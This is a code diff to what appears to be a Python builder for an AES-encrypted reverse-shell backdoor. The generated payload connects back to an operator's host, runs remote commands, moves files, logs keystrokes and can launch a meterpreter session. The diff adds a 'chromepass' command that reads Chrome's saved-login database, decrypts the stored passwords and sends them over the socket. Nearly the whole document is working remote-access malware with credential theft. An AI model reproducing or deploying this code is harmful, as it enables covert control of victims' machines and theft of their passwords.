@@ -15,9 +15,7 @@ def randVar():
 pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
 EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
 DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-key = randKey(32)
-iv = randKey(16)
-secretkey = randKey(32)
+key, iv, secretkey = randKey(32), randKey(16), randKey(32)
 
 finput = '''def MeterDrop(mhost, mport):
 	try:
@@ -108,10 +106,10 @@ s.connect((host, port))
 success = EncodeAES(cipher, 'EOFEOFEOFEOFEOFYEOFEOFEOFEOFEOFY')
 s.send(success)
 if os.name == 'nt':
-	lsvar = 'cd'
+	pwdvar = 'cd'
 else:
-	lsvar = 'pwd'
-pp = subprocess.Popen(lsvar, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+	pwdvar = 'pwd'
+pp = subprocess.Popen(pwdvar, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 pwd = pp.stdout.read().strip() + pp.stderr.read().strip()
 
 while 1:
@@ -119,6 +117,32 @@ while 1:
 	decrypted = DecodeAES(cipher, data)
 	if decrypted == "quit" or decrypted == "exit":
 		break
+
+	elif decrypted.startswith("chromepass"):
+		if pwdvar == 'cd':
+			sendpass = ''
+			appdata = os.getenv("APPDATA")
+			try:
+				connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep))
+				cursor = connection.cursor()
+				cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+				for information in cursor.fetchall():
+					passw = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+					if passw:
+						sendpass += 'Website: ' + information[0]
+						sendpass += 'Username: ' + information[1]
+						sendpass += 'Password: ' + passw + '**n'
+				if len(sendpass) > 15:
+					encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (sendpass))
+				else:
+					encrypted = EncodeAES(cipher, " [X] No stored passwords found.**nEOFEOFEOFEOFEOFX")
+				s.send(encrypted)
+			except Exception as e:
+				encrypted = EncodeAES(cipher, str(e) + "**nEOFEOFEOFEOFEOFX")
+				s.send(encrypted)
+		else:
+			encrypted = EncodeAES(cipher, " [X] Error: chromepass command is only available on windows.**nEOFEOFEOFEOFEOFX")
+			s.send(encrypted)
 
 	elif decrypted.startswith("keydump"):
 		encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (keydump))
@@ -148,25 +172,14 @@ while 1:
 			s.send(encrypted)
 
 	elif decrypted.startswith("download "):
-		if lsvar == 'cd':
-			downpath = pwd.strip('**r') + "****" + decrypted.split(' ')[1]
-			with open(downpath, 'rb') as f:
-				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
-			s.send(encrypted)
-		else:
-			downpath = pwd.strip('**r') + "/" + decrypted.split(' ')[1]
-			with open(downpath, 'rb') as f:
-				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
-			s.send(encrypted)
+		downpath = pwd.strip('**r') + os.sep + decrypted.split(' ')[1]
+		with open(downpath, 'rb') as f:
+			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
+		s.send(encrypted)
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
-		if lsvar == 'cd':
-			ufilename = pwd.strip('**r') + '****' + decrypted[16:32].strip('*')
-			f = open(ufilename, 'wb')
-		else:
-			ufilename = pwd.strip('**r') + '/' + decrypted[16:32].strip('*')
-			f = open(ufilename, 'wb')
-
+		ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
+		f = open(ufilename, 'wb')
 		f.write(decrypted[32:])
 		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
 			data = s.recv(1024)
@@ -186,7 +199,7 @@ while 1:
 		s.send(encrypted)
 
 	else:
-		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, lsvar)
+		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)
 		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 		stdout = proc.stdout.read() + proc.stderr.read()
 		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
@@ -215,7 +228,7 @@ try:
 except:
 	serverName = "server.py"
 
-readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('****', '\\\\').replace('**r', '\\r')
+readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r')
 f = open(outputName, 'w')
 cipherEnc = AES.new(key)
 encrypted = EncodeAES(cipherEnc, readyscript)
@@ -223,9 +236,9 @@ encrypted = EncodeAES(cipherEnc, readyscript)
 b64var = randVar()
 aesvar = 'AES'
 f.write('''#!/usr/bin/env python
-import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
+import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
 try:
-	import win32api,win32gui,win32file,win32console,pyHook,pythoncom
+	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom
 except:
 	pass
 ''' % (b64var))
@@ -252,7 +265,7 @@ def fnextcmd():
 
 	if nextcmd.startswith('upload '):
 		upfile = nextcmd.split(' ')[1]
-		ufilename = upfile.split('/')[-1].split('****')[-1]
+		ufilename = upfile.split(os.sep)[-1]
 		if len(ufilename) > 16:
 			print ' [X] Error, Filename must be shorter than 16 characters**n'
 			fnextcmd()
@@ -267,11 +280,11 @@ def fnextcmd():
 				fnextcmd()
 
 	elif nextcmd == '?' or nextcmd == 'help':
-		print ' AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n'
+		print ' AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords. (windows)**n'
 		fnextcmd()
 
 	elif nextcmd.startswith('download '):
-		downfile = nextcmd.split(' ')[1].split('/')[-1].split('****')[-1]
+		downfile = nextcmd.split(' ')[1].split(os.sep)[-1]
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
@@ -279,7 +292,7 @@ def fnextcmd():
 		encrypted = EncodeAES(cipher, nextcmd)
 		s.send(encrypted)
 
-commands = ['download ', 'upload ', 'met ', 'keyscan', 'keydump', 'keyclear', 'run ']
+commands = ['download ', 'upload ', 'met ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass']
 readline.parse_and_bind("tab: complete")
 readline.set_completer(completer)
 BLOCK_SIZE = 32
@@ -304,7 +317,7 @@ while True:
 		fnextcmd()
 
 	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
-		print ' [*] AES-Encrypted connection established with %s:%s**n**n  AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n' % (address[0],address[1])
+		print ' [*] AES-Encrypted connection established with %s:%s**n**n  AES-shell options:**n  download filepath   -  Download a file from remote system to pwd**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n  met host port       -  Execute a reverse_tcp meterpreter to host:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords. (windows)**n' % (address[0],address[1])
 		fnextcmd()
 
 	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
@@ -329,7 +342,7 @@ while True:
 		break
 '''
 se = open(serverName, 'wb')
-finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('****', '\\\\').replace('***PORT***', portnumber)
+finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
 se.write(finalserver)
 se.close()
 os.system('chmod +x %s %s' % (outputName, serverName))
